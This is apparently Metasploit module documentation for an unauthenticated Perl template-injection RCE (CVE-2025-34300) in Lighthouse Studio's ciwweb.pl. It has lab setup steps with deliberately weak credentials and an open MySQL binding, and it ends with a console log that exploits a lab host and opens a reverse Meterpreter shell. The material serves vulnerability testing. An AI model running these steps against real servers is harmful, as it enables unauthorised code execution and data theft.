## Vulnerable Application

This module exploits a template injection vulnerability in the
Sawtooth Software Lighthouse Studio's `ciwweb.pl` web application.
The application fails to properly sanitize user input within survey templates,
allowing unauthenticated attackers to inject and execute arbitrary Perl commands
on the target system.

This vulnerability affects Lighthouse Studio versions prior to 9.16.14.
Successful exploitation may result in remote code execution under the privileges
of the web server, potentially exposing sensitive data or disrupting survey operations.

An attacker can execute arbitrary system commands in the context of the user running the web server.

## STUDYNAME parameter

The `STUDYNAME` parameter must be set manually if the server responds with the error `Cannot find default studyname`, which occurs when the `hid_studyname` parameter is not provided.
The `hid_studyname` parameter serves as the identifier of the survey or test being executed.

## Testing

### Setup a Linux Server to Host the Lighhouse Survey

To set up a test environment:

1. Download and Install Ubuntu 18.04.6 LTS

Download the ISO from the official Ubuntu archive:
https://releases.ubuntu.com/18.04/

2. Update Package Index

After installation, update your system’s package list:

```
sudo apt update
```

3. Install MySQL 5.7

Install MySQL 5.7, the target version:

```
sudo apt -y install mysql-server-5.7
```

Once installed, MySQL should start automatically. If not, run:

```
sudo systemctl start mysql
```

4. Install Perl Modules

Install core build tools and the cpanm Perl module manager:

```
sudo apt -y install build-essential cpanminus
```

Install required Perl modules with specific versions:

```
sudo cpanm DBI@1.642
sudo cpanm DBD::mysql@4.050
sudo cpanm JSON::PP@4.00
sudo cpanm DateTime@1.06 
```

```
sudo apt install libdbd-mysql-perl
```

5. Install and Start Apache Web Server

```
sudo apt install -y apache2
sudo systemctl start apache2
sudo systemctl enable apache2
```

Apache will now be running and set to start automatically on boot.

6. Enable CGI and Perl Support in Apache

Install the required Apache modules and enable CGI execution:

```
sudo apt install -y libapache2-mod-perl2
sudo a2enmod perl
sudo a2enmod cgi
sudo systemctl restart apache2
```

This allows Perl CGI scripts to be executed from the web server.

7. Install and Start FTP Server (vsftpd)

```
sudo apt install -y vsftpd
sudo systemctl start vsftpd
sudo systemctl enable vsftpd
```

8. Configure FTP Access

Create FTP User

```
sudo adduser ftpuser
```

Set Directory Permissions

```
sudo chown -R ftpuser:ftpuser /var/www/html
```

Edit FTP Configuration.
Open the config file:

```
sudo nano /etc/vsftpd.conf
```

Update or add the following settings:

```
listen=YES
listen_ipv6=NO

anonymous_enable=NO
local_enable=YES
write_enable=YES

chroot_local_user=YES
allow_writeable_chroot=YES

user_sub_token=$USER
local_root=/var/www/html

local_umask=022
file_open_mode=0644
```

Then restart the FTP service:

```
sudo systemctl restart vsftpd
sudo systemctl enable vsftpd
```

9. Configure MySQL Access

Create a Test User and Database

Login to MySQL:

```
sudo mysql -u root
```

Then execute:

```
CREATE USER 'test'@'%' IDENTIFIED BY 'test';
CREATE DATABASE test DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
GRANT ALL PRIVILEGES ON test.* TO 'test'@'%';
FLUSH PRIVILEGES;
EXIT;
```

Allow External MySQL Connections

Edit the MySQL config:

```
sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf
```

Find the line:

```
bind-address = 127.0.0.1
```

Change it to:

```
bind-address = 0.0.0.0
```

Save and exit, then allow MySQL traffic through the firewall:

```
sudo ufw allow 3306/tcp
```

Restart MySQL:

```
sudo systemctl restart mysql
```

10. Configure Apache for CGI Scripts

Update Apache Virtual Host

Edit the default site config:

```
sudo nano /etc/apache2/sites-enabled/000-default.conf
```

Inside the `<VirtualHost *:80>` block, add:

```
ScriptAlias /cgi-bin/ /var/www/html/cgi-bin/

<Directory "/var/www/html/cgi-bin">
    AllowOverride None
    Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
    Require all granted
</Directory>
```

Restart Apache

```
sudo systemctl restart apache2
```

Now CGI scripts in /var/www/html/cgi-bin/ should be executable.

### Create the Lighthouse Survey

1. Download and Install Windows (on Second VM)

Download Windows 10 ISO from the official Microsoft site:
https://www.microsoft.com/en-us/software-download/windows10

Follow standard installation steps in your hypervisor (e.g., VirtualBox, VMware, etc.).

2. Download and Install Vulnerable Lighthouse Studio

This is the vulnerable application used to build and upload surveys.

https://d2rpjb6zne1wug.cloudfront.net/software-installers/Lighthouse-Studio/LighthouseStudio_9_16_12_Setup.exe

The version history page is available at:
https://sawtoothsoftware.com/resources/software-downloads/lighthouse-studio/version-history

Install Lighthouse Studio using default options.

3. Create and Save a New Study

Use

```
File -> New Study
```

and follow instructions.
In the end save the study.

4. Upload the Study to the Ubuntu VM

To host your survey on the Ubuntu VM:

In the Top Bar -> Click on Hosting

Set the following database configuration:

Database Name: `test`

Database Username: `test`

Database Password: `test`

Database Server: `MySQL`

Set FTP Access

Fill in the FTP settings:

FTP Host: `IP address or hostname of your Ubuntu VM`

Username: `ftpuser`

Password: password for `ftpuser`

In the "Advanced" Tab

Set the Database Server Host Name — enter the IP address of your Ubuntu VM.

5. Upload the Survey to Server

Click the "Upload Survey to Server" button.

If all configurations are correct, Lighthouse Studio will:

- Upload the survey files via FTP
- Initialize the MySQL database
- Generate CGI scripts

OR (in case of any errors)

Use this instruction to upload manually [Manual Upload to Server](https://sawtoothsoftware.com/help/lighthouse-studio/manual/manual-upload.html)

## Setup a Windows Server to Host Lighthouse Survey

1. Install xampp

2. Place survey for manual upload in c:\xampp\htdocs\

3. Install Perl 5.38

- Avoid installing 5.40 as it's missing some essential MySQL libraries required to connect the Lighthouse survey to database which is required in order to exploit this vulnerability

3. The `.pl` and `.cgi` files LightHouse generates will start with `#!/usr/bin/perl` which Windows will fail to interpret
- Either find and replace these with `#!C:/Strawberry/perl/bin/perl.exe` or edit the apache config such that Apache will always send these files to Strawberry Perl
 

4. Make the same edits to the Apache config as you would do on Linux to make the cgi scripts executable

5. Install the same Perl modules as you would during the Linux install

6. In phpMyAdmin, create the DB user and DB specified in the Survey you created in Lighthouse

7. Ensure the user has the necessary privileges over the DB

8. Navigate the to the /<SurveyName>/WebUpload/cgi-bin/admin.pl endpoint in the survey, authenticate with the admin credentials and ensure the the DB is connected and there were no errors durning setup

## Scenario

```
msf6 > use exploit/multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > show options

Module options (exploit/multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80                  yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   STUDYNAME                      no        Value for the hid_studyname GET parameter
   TARGETURI  /cgi-bin/ciwweb.pl  yes       Path to vulnerable ciwweb.pl
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux Dropper



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > set RHOSTS 192.168.19.129
RHOSTS => 192.168.19.129
msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > set STUDYNAME 123
STUDYNAME => 123
msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > set LHOST eth0
LHOST => 192.168.19.130
msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > set SRVPORT 9999
SRVPORT => 9999
msf6 exploit(multi/http/lighthouse_studio_unauth_rce_CVE_2025_34300) > run

[*] Started reverse TCP handler on 192.168.19.130:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Extracting version...
[*] Extracted version: 9.16.12
[+] The target appears to be vulnerable.
[*] Uploading malicious payload...
[*] Command Stager progress -  44.31% done (362/817 bytes)
[*] Uploading malicious payload...
[*] Sending stage (3045380 bytes) to 192.168.19.129
[*] Meterpreter session 1 opened (192.168.19.130:4444 -> 192.168.19.129:39790) at 2025-07-20 07:04:31 -0400
[*] Command Stager progress -  97.31% done (795/817 bytes)
[*] Uploading malicious payload...
[*] Command Stager progress - 100.00% done (817/817 bytes)

meterpreter > sysinfo
Computer     : 192.168.19.129
OS           : Ubuntu 18.04 (Linux 5.4.0-150-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >

```